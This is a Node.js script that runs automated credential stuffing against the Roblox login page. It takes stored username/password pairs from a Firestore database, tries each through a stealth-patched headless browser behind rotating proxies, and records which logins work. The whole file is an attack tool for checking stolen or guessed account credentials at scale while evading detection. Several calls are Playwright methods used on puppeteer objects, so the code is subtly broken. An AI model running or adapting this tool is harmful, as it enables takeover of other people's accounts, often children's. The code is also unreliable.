const admin = require('firebase-admin');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cron = require('node-cron');
const express = require('express');
const cors = require('cors');
const path = require('path');

puppeteer.use(StealthPlugin());

// 🔥 PASTE YOUR SERVICE ACCOUNT JSON HERE or upload file
const serviceAccount = require('./oren-devs-firebase-adminsdk.json');
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const URL = 'https://roblox.com/login';
let stats = { processed: 0, valid: 0, invalid: 0 }; 

// 🛡️ PROXY LIST (Render compatible - free proxies)
const proxies = [
  'http://20.210.113.32:80',
  'http://154.16.63.190:80',
  'http://67.43.228.253:25803',
  // Add more or use proxy service
];

async function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

async function validateCredential(credential) {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--no-first-run',
      '--no-zygote',
      `--proxy-server=${await getRandomProxy()}`
    ]
  });

  const context = await browser.newContext({
    viewport: { width: 1920, height: 1080 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
  });
  
  const page = await context.newPage();
  
  try {
    console.log(`🔍 Validating: ${credential.username}`);
    
    await page.goto(URL, { waitUntil: 'networkidle0', timeout: 30000 });
    await page.waitForSelector('#login-username', { timeout: 10000 });
    
    // Fill & submit
    await page.fill('#login-username', credential.username);
    await page.fill('#login-password', credential.password);
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle', { timeout: 15000 });
    
    // Check success: settings icon + no error
    const hasError = await page.$('.error, .alert, [class*="error"], [class*="invalid"]');
    const hasSettings = await page.$('span#nav-settings');
    
    if (hasError || !hasSettings) {
      // ❌ Invalid
      await db.collection('credentials').doc(credential.id).update({
        status: 'invalid',
        processed_at: admin.firestore.FieldValue.serverTimestamp()
      });
      stats.invalid++;
      return 'invalid';
    }
    
    // ✅ Valid - LOGOUT
    await page.click('span#nav-settings');
    await page.waitForSelector('a.rbx-menu-item.logout-menu-item', { timeout: 5000 });
    await page.click('a.rbx-menu-item.logout-menu-item');
    await page.waitForLoadState('networkidle');
    
    // Update as valid
    await db.collection('credentials').doc(credential.id).update({
      status: 'valid',
      processed_at: admin.firestore.FieldValue.serverTimestamp()
    });
    stats.valid++;
    console.log(`✅ VALID: ${credential.username}`);
    return 'valid';
    
  } catch (error) {
    console.error(`❌ Error ${credential.username}:`, error.message);
    await db.collection('credentials').doc(credential.id).update({
      status: 'invalid',
      error: error.message,
      processed_at: admin.firestore.FieldValue.serverTimestamp()
    });
    stats.invalid++;
    return 'invalid';
  } finally {
    await browser.close();
  }
}

async function processPending() {
  const snapshot = await db.collection('credentials')
    .where('status', '==', 'pending')
    .limit(1)
    .get();
  
  if (snapshot.empty) {
    console.log('⏸️ No pending credentials');
    return;
  }
  
  const doc = snapshot.docs[0];
  const data = doc.data();
  data.id = doc.id;
  
  console.log(`📥 Processing: ${data.username}`);
  stats.processed++;
  
  await validateCredential(data);
  
  console.log(`📊 Stats: ${stats.processed} processed | ${stats.valid} valid | ${stats.invalid} invalid`);
}

// API Endpoints
app.get('/api/stats', (req, res) => res.json(stats));
app.get('/api/pending', async (req, res) => {
  const snapshot = await db.collection('credentials')
    .where('status', '==', 'pending').limit(20).get();
  res.json(snapshot.docs.map(d => ({ id: d.id, ...d.data() }))); 
});

// Dashboard
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Validator running on port ${PORT}`));

// 🕐 Run every 30 seconds
cron.schedule('*/30 * * * * *', processPending);
console.log('⏰ Scheduled: every 30 seconds');
processPending(); // Run once on start
